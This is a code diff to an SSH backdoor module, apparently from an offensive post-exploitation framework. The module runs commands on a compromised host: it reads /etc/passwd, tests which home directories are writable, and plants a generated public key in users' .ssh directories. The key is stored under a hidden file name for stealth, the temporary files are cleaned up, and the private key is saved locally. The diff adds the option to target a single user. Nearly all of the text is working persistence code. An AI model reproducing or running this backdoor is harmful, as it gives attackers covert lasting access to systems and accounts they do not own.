@@ -11,7 +11,7 @@ from loguru import logger
 
 # Local application/library specific imports
 from toboggan.core.action import BaseAction
-from toboggan.core.utils.common import generate_fixed_length_token
+from toboggan.core.utils.common import generate_uuid
 
 
 class AutoSshBackdoorAction(BaseAction):
@@ -19,7 +19,9 @@ class AutoSshBackdoorAction(BaseAction):
         "Generate an SSH key remotely and drop it into writable user .ssh directories."
     )
 
-    def run(self) -> str:
+    def run(self, user: str = None) -> str:
+        # Generate consistent UUID for both remote and local filenames
+        guid = generate_uuid()
 
         sshd_path = self._executor.os_helper.get_command_location("sshd")
         if not sshd_path or "not found" in sshd_path.lower():
@@ -27,7 +29,7 @@ class AutoSshBackdoorAction(BaseAction):
                 "⚠️ sshd is not installed on the target. SSH backdoor is currently unusable."
             )
             return "⚠️ sshd is not installed on the target."
-       
+
         logger.info(f"🧭 sshd binary found at: {sshd_path.strip()}")
         # Check if sshd is running
         check_sshd = self._executor.remote_execute("ps aux | grep '[s]shd'")
@@ -42,7 +44,9 @@ class AutoSshBackdoorAction(BaseAction):
         # Step 1: Locate ssh-keygen
         sshkeygen_path = self._executor.os_helper.get_command_location("ssh-keygen")
         if not sshkeygen_path or "not found" in sshkeygen_path.lower():
-            logger.warning("❌ ssh-keygen not available on target. Trying locally...")
+            logger.warning(
+                "❌ ssh-keygen not available on target. Trying local generation."
+            )
 
             if os.name != "posix":
                 return "❌ ssh-keygen not available remotely, and local OS is not Unix."
@@ -51,7 +55,6 @@ class AutoSshBackdoorAction(BaseAction):
             with tempfile.TemporaryDirectory() as tmpdir:
                 tmpdir_path = Path(tmpdir)
                 key_path = tmpdir_path / "id_ed25519"
-                comment = generate_fixed_length_token(12)
 
                 # Generate key locally
                 try:
@@ -64,8 +67,6 @@ class AutoSshBackdoorAction(BaseAction):
                             str(key_path),
                             "-N",
                             "",
-                            "-C",
-                            comment,
                             "-q",
                         ],
                         check=True,
@@ -78,15 +79,11 @@ class AutoSshBackdoorAction(BaseAction):
                 logger.info("🔑 SSH keypair generated locally.")
         else:
             logger.info(f"🔑 ssh-keygen found at: {sshkeygen_path}")
-            # Step 3: Generate random key filename and comment
-            token = generate_fixed_length_token(6)
-            key_path = f"/tmp/id_ed25519_{token}"
-            comment = generate_fixed_length_token(12)  # stealthy random comment
+            # Use the GUID generated at the start (hidden file for stealth)
+            key_path = f"/tmp/.{guid}"
 
             # Step 4: Generate SSH keypair
-            gen_cmd = (
-                f"{sshkeygen_path} -t ed25519 -f {key_path} -N '' -C '{comment}' -q"
-            )
+            gen_cmd = f"{sshkeygen_path} -t ed25519 -f {key_path} -N '' -q"
             self._executor.remote_execute(gen_cmd)
 
             logger.info(f"🔑 SSH keypair generated at: {key_path}")
@@ -104,29 +101,56 @@ class AutoSshBackdoorAction(BaseAction):
         if not passwd_data:
             return "❌ Could not read /etc/passwd."
 
-        logger.info("🔍 Searching for writable home directories...")
-
         candidate_users = []
-        for line in passwd_data.strip().splitlines():
-            parts = line.split(":")
-            if len(parts) < 7:
-                continue
-            username, _, uid, _, _, home, _ = parts
-            try:
-                if username != "root":
-                    if int(uid) < 1000 or username in ["nobody", "sync"]:
-                        continue
-            except ValueError:
-                continue
 
+        if user:
+            # Direct lookup for specific user
+            logger.info(f"🎯 Targeting specific user: {user}")
+
+            # Find the user's home directory from passwd
+            home = None
+            for line in passwd_data.strip().splitlines():
+                parts = line.split(":")
+                if len(parts) >= 7 and parts[0] == user:
+                    home = parts[5]
+                    break
+
+            if not home:
+                return f"⚠️ User '{user}' not found in /etc/passwd."
+
+            # Test if home directory is writable
             test_write = self._executor.remote_execute(
-                f"test -w {home} && echo OK || echo NO"
+                f"test -w {home} && echo O || echo N"
             )
-            if test_write and "OK" in test_write:
-                candidate_users.append((username, home))
+            if test_write and "O" in test_write:
+                candidate_users.append((user, home))
+            else:
+                return f"⚠️ User '{user}' home directory is not writable: {home}"
+        else:
+            # Search all writable home directories
+            logger.info("🔍 Searching for writable home directories")
 
-        if not candidate_users:
-            return "⚠️ No writable home directories found."
+            for line in passwd_data.strip().splitlines():
+                parts = line.split(":")
+                if len(parts) < 7:
+                    continue
+                username, _, uid, _, _, home, _ = parts
+
+                try:
+                    if username != "root":
+                        if int(uid) < 1000 or username in ["nobody", "sync"]:
+                            continue
+                except ValueError:
+                    continue
+
+                test_write = self._executor.remote_execute(
+                    f"test -w {home} && echo O || echo N"
+                )
+                if test_write and "O" in test_write:
+                    candidate_users.append((username, home))
+
+            if not candidate_users:
+                return "⚠️ No writable home directories found."
 
         logger.info(f"👤 Found {len(candidate_users)} writable home directories.")
 
@@ -148,8 +172,8 @@ class AutoSshBackdoorAction(BaseAction):
         # Step 7: Clean up temporary keypair
         self._executor.remote_execute(f"rm -f {key_path} {key_path}.pub")
 
-        # Save private key locally
-        local_save_path = Path.cwd() / "id_ed25519_backdoor"
+        # Save private key locally with same GUID as remote file
+        local_save_path = Path.cwd() / f"id_ed25519_{guid}"
         try:
             local_save_path.write_text(private_key)
             local_save_path.chmod(0o600)
@@ -166,5 +190,7 @@ class AutoSshBackdoorAction(BaseAction):
         for username, path in injected:
             output += f"👤 {username:<15} → {path}\n"
         output += "-" * 60 + "\n"
-        output += "\n🔑 Private Key (save this locally to connect):\n"
-        output += "-"
+        output += f"\n💾 Private key saved locally: {local_save_path}\n"
+        output += "-" * 60
+
+        return output
